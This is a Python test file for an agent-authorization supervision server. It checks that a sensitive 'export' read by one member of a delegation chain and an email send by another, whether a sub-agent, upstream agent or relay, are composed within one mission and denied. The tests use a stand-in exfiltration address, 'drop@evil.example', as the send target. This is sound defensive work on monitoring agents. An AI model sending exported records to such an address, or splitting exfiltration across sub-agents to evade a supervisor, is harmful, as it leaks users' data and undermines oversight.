"""Composition holds across a delegation chain inside one mission.

AAuth lets a parent agent request tokens for a sub-agent (`subagent_token`) and a
resource act as an agent downstream (`upstream_token`); downstream tokens carry the
upstream `mission_s256` (AAuth Protocol, Document History, -11). The SS keeps history per
mission, so splitting an exfiltration across members of the chain does not hide it: the
sensitive read by one and the external send by another still compose.
"""
from __future__ import annotations

import pytest
from conftest import AGENT, SUB, connected, make_env

from aauth_supervision_server.jwk import b64u
from aauth_supervision_server.testing import r3_bytes

RECORDS = "https://records.example"
MAIL = "https://mail.example"
SUBAGENT = {"subagent_token": "eyJ.subagent.token"}
UPSTREAM = {"upstream_token": "eyJ.upstream.token"}


def _decide(env, s256, resource, proposal, chain):
    ss, ps, clock = env
    raw, digest = r3_bytes(proposal)
    sdi = ps.nid("d")
    body = {"sdi": sdi, "act": "auth_token", "iat": int(clock()), "sub": SUB, "agent": AGENT,
            "mission_s256": s256, "agent_token": ps.agent_token(AGENT),
            "resource_token": ps.resource_token(resource, "", digest, s256),
            "presented_token": "a.b.c", "r3_proposal": b64u(raw), **chain}
    decision = ps.call(ss, "POST", "/decision", body).json()["decision"]
    if decision == "allow":
        assert ps.issued(ss, SUB, AGENT, s256, sdi, resource).status == 201
    return decision


@pytest.mark.parametrize(("read_chain", "send_chain"), [
    ({}, {}), (SUBAGENT, {}), ({}, SUBAGENT), ({}, UPSTREAM), (UPSTREAM, SUBAGENT)])
def test_split_exfiltration_across_the_chain_is_denied(read_chain, send_chain):
    env = make_env(transport="forwarded")
    s256 = connected(env, resources=(RECORDS, MAIL))
    read = {"operations": [{"tool": "export"}], "parameters": {}}
    send = {"operations": [{"tool": "send_email"}], "parameters": {"to": "drop@evil.example"}}
    assert _decide(env, s256, RECORDS, read, read_chain) == "allow"
    assert _decide(env, s256, MAIL, send, send_chain) == "deny"


def test_the_same_send_alone_is_allowed():
    # Control: without the sensitive read earlier in the mission the send is allowed, so
    # the deny above comes from the composition, not from the send.
    env = make_env(transport="forwarded")
    s256 = connected(env, resources=(RECORDS, MAIL))
    send = {"operations": [{"tool": "send_email"}], "parameters": {"to": "drop@evil.example"}}
    assert _decide(env, s256, MAIL, send, SUBAGENT) == "allow"


RELAY = "aauth:relay@tools.example"


def _relay_send(env, s256, envelope):
    # An intermediary downstream in the chain (Protocol L842): it sends no `mission_s256`
    # of its own; the mission comes with the upstream token, and the resource token copies
    # it unchanged (L755).
    from aauth_supervision_server.testing import make_jwt
    ss, ps, clock = env
    send = {"operations": [{"tool": "send_email"}], "parameters": {"to": "drop@evil.example"}}
    raw, digest = r3_bytes(send)
    body = {"sdi": ps.nid("d"), "act": "auth_token", "iat": int(clock()), "sub": SUB,
            "agent": RELAY, "agent_token": ps.agent_token(RELAY),
            "resource_token": ps.resource_token(MAIL, "", digest, s256),
            "presented_token": "a.b.c", "r3_proposal": b64u(raw),
            "upstream_token": make_jwt(ps.key, "aa-auth+jwt", {
                "iss": "https://as.example", "ps": ps.issuer, "sub": "p",
                "mission_s256": s256}), **envelope}
    return ps.call(ss, "POST", "/decision", body)


@pytest.mark.parametrize("envelope", ["same", "none"])
def test_a_relay_s_act_is_in_the_mission_its_tokens_carry(envelope):
    # Supervision L201 names the mission "when it names one"; a PS may leave it to the
    # tokens. Either way the act is the mission's, and the split exfiltration is denied.
    env = make_env(transport="forwarded")
    s256 = connected(env, resources=(RECORDS, MAIL))
    read = {"operations": [{"tool": "export"}], "parameters": {}}
    assert _decide(env, s256, RECORDS, read, {}) == "allow"
    r = _relay_send(env, s256, {"mission_s256": s256} if envelope == "same" else {})
    assert r.status == 200 and r.json()["decision"] == "deny"


def test_an_envelope_mission_the_tokens_contradict_is_refused():
    env = make_env(transport="forwarded")
    s256 = connected(env, resources=(RECORDS, MAIL))
    r = _relay_send(env, s256, {"mission_s256": "x" * 43})
    assert r.status == 400 and r.json()["detail"] == (
        "mission_s256 is not the mission the forwarded tokens carry")


def test_a_relay_s_decision_is_recorded_in_the_mission_its_tokens_carry():
    # Its issuance, reported later, is then booked in that mission, where the acts after
    # it compose with it.
    from aauth_supervision_server.store import Store
    env = make_env(transport="forwarded")
    ss, ps, _ = env
    s256 = connected(env, resources=(RECORDS, MAIL))
    r = _relay_send(env, s256, {})
    assert r.status == 200
    assert ss.store.decisions[Store.k(ps.issuer, r.json()["sdi"])].mission_s256 == s256


def test_a_forwarded_token_whose_mission_is_not_a_string_is_refused():
    from aauth_supervision_server.testing import make_jwt
    env = make_env(transport="forwarded")
    ss, ps, clock = env
    connected(env, resources=(RECORDS, MAIL))
    body = {"sdi": ps.nid("d"), "act": "auth_token", "iat": int(clock()), "sub": SUB,
            "agent": RELAY, "agent_token": ps.agent_token(RELAY),
            "resource_token": ps.resource_token(MAIL), "presented_token": "a.b.c",
            "upstream_token": make_jwt(ps.key, "aa-auth+jwt", {"ps": ps.issuer,
                                                               "mission_s256": 7})}
    r = ps.call(ss, "POST", "/decision", body)
    assert r.status == 400 and r.json()["detail"] == (
        "upstream_token mission_s256 is not a string")
